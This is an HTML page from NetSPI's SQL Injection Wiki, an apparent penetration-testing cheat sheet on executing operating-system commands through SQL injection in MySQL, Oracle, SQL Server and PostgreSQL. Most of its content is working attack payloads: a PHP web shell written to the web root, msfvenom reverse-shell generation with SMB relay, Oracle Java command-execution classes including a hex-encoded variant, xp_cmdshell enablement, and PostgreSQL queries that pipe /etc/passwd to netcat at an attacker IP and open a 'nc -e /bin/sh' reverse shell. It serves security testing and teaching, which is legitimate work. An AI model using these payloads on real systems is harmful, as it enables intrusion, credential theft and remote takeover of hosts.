<html>

<head>
  <meta charset="utf-8">
  <title>OS Commands | NetSPI SQL Injection Wiki</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="../../assets/scss/index.css%3F1571409135814090317.css" />
  <link rel="stylesheet" href="../../assets/scss/nav.css%3F1571409135814090317.css" />
  <link rel="stylesheet" href="../../assets/scss/tab.css%3F1571409135814090317.css" />
  <!-- We're going to load JS up top, this makes sure all of our painting is done hopefully in one sweep  -->
  <script src="../../assets/javascripts/cash.min.js"></script>
  <script type="text/javascript" async src="../../assets/javascripts/index.js%3F1571409135814090317"></script>
  
  <script type="text/javascript" async src="../../assets/javascripts/tab.js%3F1571409135814090317"></script>
  
  <meta name="theme-color" content="#ffffff">
  <meta property="og:type" content="website" />
  <meta property="og:title" content="NetSPI SQL Injection Wiki" />
  <meta property="og:description" content="Running OS commands is one of the primary objectives of SQL injection, this aids in getting full control of the host OS." />
  <meta property="og:image" content="/assets/images/facebookCard.jpg" />
  <meta name="twitter:title" content="NetSPI SQL Injection Wiki" />
  <meta name="twitter:description" content="Running OS commands is one of the primary objectives of SQL injection, this aids in getting full control of the host OS." />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:image" content="/assets/images/twitterCard.jpg">
  <meta name="twitter:site" content="@netspi" />
  <meta name="twitter:creator" content="@netspi" />
  <meta name="description" content="Running OS commands is one of the primary objectives of SQL injection, this aids in getting full control of the host OS.">
  <meta name="keywords" content="netspi, sql injection, wiki, sqli, sql, injection, netspy, network security professionals, oracle, mysql, sqlserver, mssql, cheat sheet, cheat, sheet,os command, operating system command, command injection">
  <link rel="author" href="https://netspi.com" />
  <link rel="shortcut icon" href="../../assets/images/favicon.ico">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
</head>

<body class="preload">
  <div class="mobile"></div>
  <div id="contentWrapper">
    <div id="topBar">
      <div class="n-nav-icon default">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
      </div>
      <div id="logoContainer">
      <a href="https://netspi.com"><img src="../../assets/images/logo.png%3F1571409135814090317" /></a><br/>
      </div>
    </div>
    <div class="n-navbar default">
      <ul>
  
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/" href="../../index.html">
      
    <div>Home</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" target="_blank" rel="noopener" href="https://netspi.com">
    
    <div>About Us</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/detection" href="../../detection.html">
      
    <div>Injection Detection</div>
    </a>
  </li>
   
  
  <li class="n-nav-item n-top-nav-item">
    
    <a class="link" data-route="/dbmsIdentification/" href="../../dbmsIdentification/index.html">
      
    <div>DBMS Identification</div>
    </a>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/injectionTypes/" href="../../injectionTypes/index.html">
          
          <div>Injection Types</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/errorBased/" href="../../injectionTypes/errorBased/index.html">
          
          <div>Error Based Injection</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/unionBased/" href="../../injectionTypes/unionBased/index.html">
          
          <div>Union Based Injection</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTypes/blindBased/" href="../../injectionTypes/blindBased/index.html">
          
          <div>Blind Based Injection</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/injectionTechniques/" href="../../injectionTechniques/index.html">
          
          <div>Injection Techniques</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/conditionalStatements/" href="../../injectionTechniques/conditionalStatements/index.html">
          
          <div>Conditional Statements</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/injectionPlacement/" href="../../injectionTechniques/injectionPlacement/index.html">
          
          <div>Injection Placement</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/injectionTechniques/obfuscation/" href="../../injectionTechniques/obfuscation/index.html">
          
          <div>Injection Obfuscation</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
        
        <a class="link" data-route="/attackQueries/" href="../index.html">
          
          <div>Attack Queries</div>
        </a>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/informationGathering/" href="../informationGathering/index.html">
          
          <div>Information Gathering</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/dataTargeting/" href="../dataTargeting/index.html">
          
          <div>Data Targeting</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/privilegeEscalation/" href="../privilegeEscalation/index.html">
          
          <div>Privilege Escalation</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/executingOSCommands/" href="index.html">
          
          <div>Executing OS Commands</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/readingAndWritingFiles/" href="../readingAndWritingFiles/index.html">
          
          <div>Reading and Writing Files</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/lateralMovement/" href="../lateralMovement/index.html">
          
          <div>Lateral Movement</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/dataExfiltration/" href="../dataExfiltration.html">
          
          <div>Data Exfiltration</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/attackQueries/persistence/" href="../persistence/index.html">
          
          <div>Persistence</div>
        </a>
      </li>
      
    </ul>
  </li>
   
  
  <li>
    <ul>
      
      <li class="n-nav-item n-top-nav-item">
          <div>Misc.</div>
      </li>
      
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/contributors" href="../../misc/contributors.html">
          
          <div>Contributors</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/references/" href="../../misc/references/index.html">
          
          <div>References</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/sandboxes/" href="../../misc/sandboxes/index.html">
          
          <div>Sandboxes</div>
        </a>
      </li>
      
      <li class="n-nav-item">
        
        <a class="link" data-route="/misc/tools/" href="../../misc/tools/index.html">
          
          <div>Tools</div>
        </a>
      </li>
      
    </ul>
  </li>
   
</ul>

    </div>
    <div id="contentContainer">
      <div id="tabs" class="tabs" data-tabs-ignore-url="false">

<input class="tabInput"  name="tabs" type="radio" id="mysql"/>
<label class="tabLabel" onClick="updateTab('mysql',false)" for="mysql">MySQL</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="executing-os-commands">Executing OS Commands Through MySQL</h3>

<p class="pageDescription">Running OS commands is one of the primary objectives of SQL injection, this aids in getting full control of the host OS. This may happen by directly executing commands, modifying existing data to put a shell on a webpage, or exploiting hidden functionality in the database.</p>

<table class="table table-striped table-hover">
    <thead>
        <tr>
            <th>Description</th>
            <th align="left">Query</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Command Execution (PHP)</td>
            <td>SELECT "&lt;? echo passthru($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/shell.php'</td>
        </tr>
        <tr>
            <td>Command Execution with MySQL CLI Access</td>
            <td><a rel="noopener" target="_blank" href="https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/</a></td>
        </tr>
    </tbody>
</table>




<h3 id="smb-relay-shell">SMB Relay Shell</h3>

<p><strong>Requires</strong> <br> * <a rel="noopener" target="_blank" href="https://www.metasploit.com/">Metasploit</a> <br> * <a rel="noopener" target="_blank" href="https://github.com/CoreSecurity/impacket">smbrelayx</a></p>

<p><strong>Generate the reverse shell payload</strong></p>

<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR.IP.GOES.HERE LPORT=443  -f exe &gt; reverse_shell.exe</code></p>

<p><strong>Generate a listener to deliver the reverse shell</strong></p>

<p><code>smbrelayx.py -h VICTIM.IP.GOES.HERE -e ./reverse_shell.exe</code></p>

<p><strong>Execute any one of the MySQL queries below to call the listener</strong></p>

<pre><code>select load_file('\\\\YOUR.IP.GOES.HERE\\aa');
select load_file(0x5c5c5c5c3139322e3136382e302e3130315c5c6161);
select 'netspi' into dumpfile '\\\\YOUR.IP.GOES.HERE\\aa';
select 'netspi' into outfile '\\\\YOUR.IP.GOES.HERE\\aa';
load data infile '\\\\YOUR.IP.GOES.HERE\\aa' into table database.table_name;
</code></pre>

<p>For more information see <a rel="noopener" target="_blank" href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/">here</a></p>

</div>

<input class="tabInput"  name="tabs" type="radio" id="oracle"/>
<label class="tabLabel" onClick="updateTab('oracle',false)" for="oracle">Oracle</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="executing-os-commands">Executing OS Commands Through Oracle</h3>

<p class="pageDescription">Running OS commands is one of the primary objectives of SQL injection, this aids in getting full control of the host OS. This may happen by directly executing commands, modifying existing data to put a shell on a webpage, or exploiting hidden functionality in the database.</p>

<p><a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to execute commands if it's installed.</p>
<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Description</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Creating Java Classes</td>
      <td>
        /* create Java class */<br/> BEGIN
        <br/> EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String
        stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new
        FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';<br/> END;
        <br/> /
        <br/><br/> BEGIN

        <br/> EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';<br/> END;
        <br/> /
        <br/><br/> /* run OS command */<br/> SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;</td>
    </tr>
    <tr>
      <td>Creating Java Classes (Hex encoded)</td>
      <td>
        /* create Java class */<br/> SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
        <br/>EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b''));
        end;')) results FROM dual
        <br/><br/> /* run OS command */<br/> SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
      </td>
    </tr>
  </tbody>
</table>

</div>

<input class="tabInput"  name="tabs" type="radio" id="sqlserver"/>
<label class="tabLabel" onClick="updateTab('sqlserver',false)" for="sqlserver">SQL Server</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="executing-os-commands-through-sql-server">Executing OS Commands Through SQL Server</h3>

<p class="pageDescription">Running OS commands is one of the primary objectives of SQL injection, this aids in getting full control of the host OS. This may happen by directly executing commands, modifying existing data to put a shell on a webpage, or exploiting hidden functionality in the database.</p>

<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Name</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>xp_cmdshell</td>
      <td>-- Enable show advanced options <br>sp_configure 'show advanced options', 1 <br> RECONFIGURE <br> GO <br><br>-- Enable xp_cmdshell <br> sp_configure 'xp_cmdshell', 1 <br> RECONFIGURE <br> GO <br><br> EXEC xp_cmdshell 'net user'</td>
    </tr>
    <tr>
      <td>Write to registry autorun</td>
      <td><a href="https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/</a><br/><a href="https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e"
          target="_blank" rel="noopener">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</a></td>
    </tr>
    <tr>
      <td>Write to file autorun</td>
      <td><a href="https://blog.netspi.com/how-to-hack-database-links-in-sql-server/" target="_blank" rel="noopener">https://blog.netspi.com/how-to-hack-database-links-in-sql-server/</a></td>
    </tr>
    <tr>
      <td>Agent Jobs</td>
      <td><a href="https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution" target="_blank" rel="noopener noreferrer">https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution</a></td>
    </tr>
    <tr>
      <td>SQL Injection in stored procedures</td>
      <td><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/</a></td>
    </tr>
    <tr>
      <td>CLR Assembly</td>
      <td><a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/" target="_blank" rel="noopener">https://blog.netspi.com/attacking-sql-server-clr-assemblies/</a>
      </td>
    </tr>
    <tr>
      <td>Custom Extended Stored Procedure</td>
      <td><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp</a></td>
    </tr>
  </tbody>
</table>
<h3>TSQL</h3>
<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Name</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>ActiveX Javascript Agent Job</td>
      <td><a target="_blank" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql</a></td>
    </tr>
    <tr>
      <td>ActiveX VBScript Agent Job</td>
      <td><a target="_blank" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql</a></td>
    </tr>
    <tr>
      <td>cmdexec Agent Job</td>
      <td><a target="_blank" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql</a></td>
    </tr>
    <tr>
      <td>Powershell Agent Job</td>
      <td><a target="_blank" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql</a></td>
    </tr>
    <tr>
      <td>Custom Command Shell</td>
      <td><a target="_blank" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp</a></td>
    </tr>
    <tr>
      <td>OLE Automation Object</td>
      <td><a target="_blank" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql</a></td>
    </tr>
    <tr>
      <td>OPENROWSET</td>
      <td><a target="_blank" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql</a></td>
    </tr>
    <tr>
      <td>Python</td>
      <td><a target="_blank" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql</a></td>
    </tr>
    <tr>
      <td>R</td>
      <td><a target="_blank" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql</a></td>
    </tr>
    <tr>
      <td>xp_cmdshell proxy</td>
      <td><a target="_blank" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql</a></td>
    </tr>
  </tbody>
</table>

</div>

<input class="tabInput"  name="tabs" type="radio" id="postgresql"/>
<label class="tabLabel" onClick="updateTab('postgresql',false)" for="postgresql">PostgreSQL</label>
<div id="tabPanel" class="tabPanel">
     <h3 id="executing-os-commands-through-sql-server">Executing OS Commands Through PostgreSQL</h3>

<p class="pageDescription">Running OS commands is one of the primary objectives of SQL injection, this aids in getting full control of the host OS. This may happen by directly executing commands, modifying existing data to put a shell on a webpage, or exploiting hidden functionality in the database.</p>

<table class="table table-striped table-hover">
  <thead>
    <tr>
      <th>Name</th>
      <th>Query</th>
    </tr>
  </thead>
  <tbody>
    <tr >
      <td valign="top">
	  <br><br>  
	  FROM PROGRAM
	  </td>
	  <td valign="top">	
	  <br><br>  
		DROP TABLE IF EXISTS myoutput;<br>
		CREATE TABLE myoutput(filename text);<br>
		COPY myoutput FROM PROGRAM 'ps aux';<br>
		SELECT * FROM myoutput ORDER BY filename ASC;<br>
      </td>
    </tr>
    <tr>
      <td valign="top">
	  <br><br>  
	  Create PostgreSQL Function Mapped &nbsp;<br> 
	  to Libc System Method
	  </td>
	  <td valign="top">	
	  <br><br>  
	  		CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;<br>
		SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');<br>
		<br>
		Notes:
		<br>
		This method works with PostgreSQL 8.1 and below.  After version 9, you'll have to upload your own library with the "PG_MODULE_MAGIC" set.<br> 
		The process for this is outlined at https://www.dionach.com/blog/postgresql-9x-remote-command-execution, below is a summary.
		<br><br>
		
		1. To get the version from the PostgreSQL server use the query below.
		<br><br>
		SELECT version();
		<br><br>
		   		   
		2. To compile the library, a Linux machine with the same version of PostgreSQL as the target machine is required. Below is an example showing how to install PostgreSQL. 
		<br><br>
		apt install postgresql postgresql-server-dev-9.6
		<br><br>
		
		3. Download pgexec file from https://github.com/Dionach/pgexec/tree/master.
		<br><br>
		
		4. Compile pgexec with the command below.
		<br><br>
		gcc -I$(/usr/local/pgsql/bin/pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c<br>
		<br>
		
		5. Upload the library to the target system.  First split the file into pieces. 
		<br><br>
		split -b 2048 pg_exec.so
		<br><br>
		
		6.  The file can then be written to disk through PostgreSQL using the commands below.
		<br><br>
		SELECT lo_creat(-1);<br>
		set c0 `base64 -w 0 xaa`<br>
		INSERT INTO pg_largeobject (loid, pageno, data) values (16388, 0, decode(:'c0', 'base64'));<br>

		<br>
		Then repeat for each piece of the file.
		<br><br>
		7. Create the function.
		<br><br>
		CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;
		<br><br>		
		8. Send a reverse shell to your system.
		<br><br>
		SELECT sys('nc -e /bin/sh 10.0.0.1 4444');
		<Br><Br>
		
		Source: https://www.dionach.com/blog/postgresql-9x-remote-command-execution		
      </td>
    </tr>	
    <tr >
      <td valign="top">
	  <br><br>  
	  Metasploit postgres_payload Module<br>
	  This can be used with direct connections.
	  </td>
	  <td valign="top">	
	  <br><br>  
	https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload<br>
	exploit/linux/postgres/postgres_payload<br>
      </td>
    </tr>	
  </tbody>
</table>



</div>

</div>

      <div><div>
  <br/>
  <p>Â© 2019 Copyright by NetSPI. All rights reserved.</p>
</div>
</div>
    </div>
  </div>
</body>
</html>
